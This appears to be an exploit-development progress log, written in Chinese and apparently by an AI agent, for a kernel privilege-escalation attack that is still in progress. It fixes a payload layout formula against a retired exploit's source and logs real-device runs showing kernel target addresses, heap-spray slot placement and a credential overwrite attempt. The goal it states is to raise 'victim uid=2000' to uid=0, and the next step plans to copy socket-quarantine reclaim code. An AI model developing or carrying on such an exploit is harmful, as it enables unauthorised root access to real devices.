# 43499 · page_value 修到与退役同式，w1 已能通过（round 128）

## 关键修复（退役源码逐字为据 ✓）

```cpp
// 退役 payload_builder.cpp:56-78
if (request->preserve_child) {
    layout.right = (request->mode == Credential) ? init_cred_alias : page_base + 0x100;   // ← page_base
}
// 退役 spray.cpp:318：payload_write_layout(request, base, …)   ⇒ 传的是**原始块基址 base**

// 我此前：page_value = payload_base + 0x100   ✗（多算了 payload_delta ⇒ 判的是另一个位）
// 现在：  page_value = prepared.base + 0x100   ✓（与退役同式 ✓）
```

## 真机（本轮 ✓）

```
main: step=w1 target=0xffffff802adaad88 layout matches=1 accepts=1 value=0xffff8000000b0100   ← **通过** ✓
      （另一个步：base=0xffff800000080000 ⇒ cand=…080100 ⇒ bit16 为偶 ⇒ try 1..8 全 0 ✗）
prepare parity：同一次 base 反复出现（0x…080000 ×8 ✗）⇒ 重试不换地址 ✗
main: victim uid=2000 ✗
```

## 结论（唯一剩余缺口）

| 项 | 状态 |
| --- | --- |
| 三步三请求（模式/目标/leaf） | 与归档一致 ✓ |
| `page_value` 公式 | 与退役**逐字一致** ✓（本轮 ✓） |
| 奇偶判据 | 正确 ✓；奇 base 真实出现并通过 ✓（`0x…0b0000` ✓） |
| **放置轮换** | ✗ —— 同一步内重试拿同一 base（×8 ✗）⇒ 唯一缺口 ✓ |
| `uid=0` | 仍未 ✗ |

## 下一步（有旧代码为据 ✓）

- 读退役 `spray.cpp` 的 quarantine 实现（`quarantine_reclaim_sockets` / `release_quarantined_reclaim_sockets`
  的**内部**：它扣住的是什么 fd/什么对象 ✓）⇒ 照着让"重试之间"真的换到别的 slot ✓；
- 判据：三步全部 `accepts=1` ✓ 且**不再依赖重试** ✓；随后回到 `uid=0` ✓。
